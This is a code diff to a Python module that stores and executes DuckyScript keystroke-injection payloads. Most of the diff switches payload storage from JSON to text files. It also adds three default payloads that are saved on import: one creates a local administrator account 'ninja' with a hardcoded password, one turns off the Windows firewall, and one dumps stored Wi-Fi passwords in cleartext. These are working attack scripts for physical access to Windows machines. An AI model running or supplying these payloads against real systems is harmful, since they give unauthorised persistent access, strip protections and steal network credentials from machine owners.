@@ -38,10 +38,8 @@ def list_duckyscript_payloads():
     
     payloads = []
     for filename in os.listdir(payloads_dir):
-        if filename.endswith('.json'):
-            with open(os.path.join(payloads_dir, filename), 'r') as f:
-                payload = json.load(f)
-                payloads.append(payload['name'])
+        if filename.endswith('.txt'):
+            payloads.append(filename[:-4])  # Remove .txt extension
     return payloads
 
 def save_duckyscript_payload(name, content):
@@ -49,35 +47,68 @@ def save_duckyscript_payload(name, content):
     if not os.path.exists(payloads_dir):
         os.makedirs(payloads_dir)
     
-    payload = {
-        'name': name,
-        'content': content
-    }
-    with open(os.path.join(payloads_dir, f"{name}.json"), 'w') as f:
-        json.dump(payload, f)
+    with open(os.path.join(payloads_dir, f"{name}.txt"), 'w') as f:
+        f.write(content)
 
 def execute_duckyscript_payload(payload_name):
     payloads_dir = 'duckyscript_payloads'
-    payload_path = os.path.join(payloads_dir, f"{payload_name}.json")
+    payload_path = os.path.join(payloads_dir, f"{payload_name}.txt")
     
     if not os.path.exists(payload_path):
         return f"Payload '{payload_name}' not found"
     
     with open(payload_path, 'r') as f:
-        payload_data = json.load(f)
-        payload = DuckyScriptPayload(payload_data['name'], payload_data['content'])
+        content = f.read()
+        payload = DuckyScriptPayload(payload_name, content)
         payload.execute()
     
     return f"Executed payload: {payload_name}"
 
-# Additional function to get payload content
 def get_duckyscript_payload_content(payload_name):
     payloads_dir = 'duckyscript_payloads'
-    payload_path = os.path.join(payloads_dir, f"{payload_name}.json")
+    payload_path = os.path.join(payloads_dir, f"{payload_name}.txt")
     
     if not os.path.exists(payload_path):
         return None
     
     with open(payload_path, 'r') as f:
-        payload_data = json.load(f)
-        return payload_data['content']
+        return f.read()
+
+# Add some default DuckyScript payloads
+default_payloads = {
+    "add_admin_user": """
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "New-LocalUser -Name 'ninja' -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force); Add-LocalGroupMember -Group 'Administrators' -Member 'ninja'"
+ENTER
+""",
+    "disable_firewall": """
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
+""",
+    "dump_wifi_passwords": """
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh wlan show profiles
+ENTER
+DELAY 500
+STRING for /f "skip=9 tokens=1 delims=:" %i in ('netsh wlan show profiles') do netsh wlan show profile name=%i key=clear
+ENTER
+"""
+}
+
+# Create default payloads if they don't exist
+for name, content in default_payloads.items():
+    if not os.path.exists(os.path.join('duckyscript_payloads', f"{name}.txt")):
+        save_duckyscript_payload(name, content)
